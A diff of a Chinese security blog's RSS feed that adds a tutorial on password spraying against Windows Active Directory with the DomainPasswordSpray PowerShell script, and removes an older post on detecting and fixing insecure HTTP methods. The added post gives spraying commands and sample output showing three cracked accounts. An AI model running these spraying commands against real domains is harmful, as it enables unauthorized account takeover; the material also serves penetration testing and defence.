@@ -6,9 +6,141 @@
 </description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 02 May 2018 15:10:32 +0800</pubDate>
-    <lastBuildDate>Wed, 02 May 2018 15:10:32 +0800</lastBuildDate>
+    <pubDate>Wed, 02 May 2018 18:55:46 +0800</pubDate>
+    <lastBuildDate>Wed, 02 May 2018 18:55:46 +0800</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>Windows域渗透 - 用户密码枚举</title>
+        <description>&lt;p&gt;推荐一个Powershell脚本
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
+
+&lt;p&gt;在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-powershell&quot;&gt;0x01 Powershell&lt;/h2&gt;
+
+&lt;p&gt;目前已经有很多Powershell集合脚本，用于域渗透简直舒爽&lt;/p&gt;
+
+&lt;p&gt;今天推荐一款名字叫&lt;code class=&quot;highlighter-rouge&quot;&gt;DomainPasswordSpray.ps1&lt;/code&gt;的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x00.png&quot; alt=&quot;0x00&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x01.png&quot; alt=&quot;0x01&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-参数说明&quot;&gt;0x02 参数说明&lt;/h2&gt;
+
+&lt;p&gt;在代码的开头就已经有介绍了，我简单汉化一下。&lt;/p&gt;
+
+&lt;p&gt;描述：该模块主要用于从域中收集用户列表。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;参数： &lt;code class=&quot;highlighter-rouge&quot;&gt;Domain&lt;/code&gt; 指定要测试的域名&lt;/li&gt;
+  &lt;li&gt;参数： &lt;code class=&quot;highlighter-rouge&quot;&gt;RemoveDisabled&lt;/code&gt; 尝试从用户列表删除禁用的账户&lt;/li&gt;
+  &lt;li&gt;参数： &lt;code class=&quot;highlighter-rouge&quot;&gt;RemovePotentialLockouts&lt;/code&gt; 删除锁定账户&lt;/li&gt;
+  &lt;li&gt;参数： &lt;code class=&quot;highlighter-rouge&quot;&gt;UserList&lt;/code&gt; 自定义用户列表(字典)。 如果未指定，这将自动从域中获取&lt;/li&gt;
+  &lt;li&gt;参数： &lt;code class=&quot;highlighter-rouge&quot;&gt;Password&lt;/code&gt; 指定单个密码进行口令测试&lt;/li&gt;
+  &lt;li&gt;参数： &lt;code class=&quot;highlighter-rouge&quot;&gt;PasswordList&lt;/code&gt; 指定一个密码字典&lt;/li&gt;
+  &lt;li&gt;参数： &lt;code class=&quot;highlighter-rouge&quot;&gt;OutFile&lt;/code&gt; 将结果保存到某个文件&lt;/li&gt;
+  &lt;li&gt;参数： &lt;code class=&quot;highlighter-rouge&quot;&gt;Force&lt;/code&gt; 当枚举出第一个后继续枚举，不询问&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x03-使用说明&quot;&gt;0x03 使用说明&lt;/h2&gt;
+
+&lt;p&gt;使用例子：&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\PS&amp;gt; Get-DomainUserList&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;该命令将从域中收集用户列表。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\PS&amp;gt; Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\PS&amp;gt; Invoke-DomainPasswordSpray -Password Winter2016&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;该命令将会从域环境中获取用户名，然后逐个以密码&lt;code class=&quot;highlighter-rouge&quot;&gt;Winter2016&lt;/code&gt;进行认证枚举&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\PS&amp;gt; Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.txt -OutFile sprayed-creds.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;该命令将会从&lt;code class=&quot;highlighter-rouge&quot;&gt;users.txt&lt;/code&gt;中提取用户名，与&lt;code class=&quot;highlighter-rouge&quot;&gt;passlist.txt&lt;/code&gt;中的密码对照成一对口令，进行域认证枚举，登录成功的结果将会输出到&lt;code class=&quot;highlighter-rouge&quot;&gt;sprayed-creds.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x04-实战&quot;&gt;0x04 实战&lt;/h2&gt;
+
+&lt;h3 id=&quot;获取域环境中的用户列表&quot;&gt;获取域环境中的用户列表&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;命令：&lt;/strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\PS&amp;gt; Get-DomainUserList | Out-File -Encoding ascii userlist.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;输出：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] There appears to be no lockout policy.
+[*] There are 8 total users found.
+[*] Created a userlist containing 8 users gathered from the current user's domain
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;获取的用户名：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\PS&amp;gt; type .\userlist.txt
+Administrator
+Guest
+liyingzhe
+krbtgt
+Hack
+testPass
+webManager
+dba
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;密码枚举&quot;&gt;密码枚举&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x02.png&quot; alt=&quot;0x02&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;命令：&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\PS&amp;gt; Invoke-DomainPasswordSpray -Domain 域名 -Password w!23456 -OutFile sprayed-creds.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;输出：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] There appears to be no lockout policy.
+[*] Removing disabled users from list.
+[*] There are 6 total users found.
+[*] Removing users within 1 attempt of locking out from list.
+[*] Created a userlist containing 6 users gathered from the current user's domain
+[*] Password spraying has begun. Current time is 18:45
+[*] This might take a while depending on the total number of users
+1 of 6 users tested2 of 6 users tested3 of 6 users tested[*] SUCCESS! User:testPass Password:w!23456
+4 of 6 users tested[*] SUCCESS! User:webManager Password:w!23456
+5 of 6 users tested[*] SUCCESS! User:dba Password:w!23456
+6 of 6 users tested[*] Password spraying is complete
+[*] Any passwords that were successfully sprayed have been output to sprayed-creds.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;枚举的结果：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\PS &amp;gt; type .\sprayed-creds.txt
+testPass:w!23456
+webManager:w!23456
+dba:w!23456
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+        <pubDate>Wed, 02 May 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/archivers/2018-05-02/1</link>
+        <guid isPermaLink="true">http://localhost:4000/archivers/2018-05-02/1</guid>
+        
+        
+        <category>内网渗透</category>
+        
+      </item>
     
       <item>
         <title>Windows内网渗透基础命令</title>
@@ -844,148 +976,6 @@ v &quot;NtfsDisable8dot3NameCreation&quot; /t REG_DWORD /d 1 /f
         
         
         <category>生活</category>
-        
-      </item>
-    
-      <item>
-        <title>服务器启用了不安全的HTTP方法</title>
-        <description>&lt;p&gt;《Web安全测试学习手册》- 服务器启用了不安全的HTTP方法
-&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x00-不安全的http方法&quot;&gt;0x00 不安全的HTTP方法&lt;/h2&gt;
-
-&lt;h3 id=&quot;1什么是不安全的http方法&quot;&gt;1）什么是不安全的HTTP方法&lt;/h3&gt;
-
-&lt;p&gt;开发人员、运维人员一般可能用于调试服务器，开启了一些客户端能够直接读写服务器端文件的方法，例如： DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK 等HTTP协议支持的方法。&lt;/p&gt;
-
-&lt;h3 id=&quot;2不安全的http方法特点&quot;&gt;2）不安全的HTTP方法特点&lt;/h3&gt;
-
-&lt;p&gt;可通过浏览器直接读写服务器端文件&lt;/p&gt;
-
-&lt;h2 id=&quot;0x01-不安全的http方法---风险等级&quot;&gt;0x01 不安全的HTTP方法 - 风险等级&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;高&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-不安全的http方法---原理&quot;&gt;0x02 不安全的HTTP方法 - 原理&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;方法&lt;/th&gt;
-      &lt;th&gt;说明&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;PUT&lt;/td&gt;
-      &lt;td&gt;向指定的目录上载文件&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;DELETE&lt;/td&gt;
-      &lt;td&gt;删除指定的资源&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;COPY&lt;/td&gt;
-      &lt;td&gt;将指定的资源复制到Destination消息头指定的位置&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;MOVE&lt;/td&gt;
-      &lt;td&gt;将指定的资源移动到Destination消息头指定的位置&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;SEARCH&lt;/td&gt;
-      &lt;td&gt;在一个目录路径中搜索资源&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;PROPFIND&lt;/td&gt;
-      &lt;td&gt;获取与指定资源有关的信息，如作者、大小与内容类型&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;TRACE&lt;/td&gt;
-      &lt;td&gt;在响应中返回服务器收到的原始请求&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;服务器端由于配置权限不当，导致允许了客户端发送 DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK等请求，并且解析请求进行操作文件。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-不安全的http方法---常见场景&quot;&gt;0x03 不安全的HTTP方法 - 常见场景&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Tomcat 中间件&lt;/li&gt;
-  &lt;li&gt;IIS 中间件&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;
-
-&lt;p&gt;使用CURL发送OPTIONS请求，查看响应头中的Allow行&lt;/p&gt;
-
-&lt;p&gt;命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;curl -I -X OPTIONS http://payloads.online&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  ~ curl -I -X OPTIONS http://10.211.55.16/
-HTTP/1.1 200 OK
-Date: Wed, 18 Apr 2018 02:17:47 GMT
-Server: Microsoft-IIS/6.0
-MS-Author-Via: DAV
-Content-Length: 0
-Accept-Ranges: none
-DASL: &amp;lt;DAV:sql&amp;gt;
-DAV: 1, 2
-Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
-Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
-Cache-Control: private
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;若出现PUT、DELETE….等方法，则存在此风险&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-18/0x00.png&quot; alt=&quot;0x00&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;
-
-&lt;h3 id=&quot;iis&quot;&gt;IIS&lt;/h3&gt;
-
-&lt;p&gt;修改站点权限，取消“写入”&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-18/0x01.gif&quot; alt=&quot;0x01&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;tomcat&quot;&gt;Tomcat&lt;/h3&gt;
-
-&lt;p&gt;修改&lt;code class=&quot;highlighter-rouge&quot;&gt;web.xml&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;security-constraint&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;web-resource-collection&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;web-resource-name&amp;gt;&lt;/span&gt;fortune&lt;span class=&quot;nt&quot;&gt;&amp;lt;/web-resource-name&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;PUT&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;DELETE&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;HEAD&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;OPTIONS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;TRACE&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/web-resource-collection&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;auth-constraint&amp;gt;&amp;lt;/auth-constraint&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/security-constraint&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;login-config&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;auth-method&amp;gt;&lt;/span&gt;BASIC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/auth-method&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/login-config&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;
-
-&lt;p&gt;在 &lt;code class=&quot;highlighter-rouge&quot;&gt;server&lt;/code&gt;代码块内写入如下代码，用于屏蔽非GET、POST请求：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if ($request_method !~* GET|POST) {
-            return 403;
-
-   }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-</description>
-        <pubDate>Wed, 18 Apr 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/archivers/2018-04-18/1</link>
-        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-18/1</guid>
-        
-        
-        <category>内网渗透</category>
         
       </item>
     
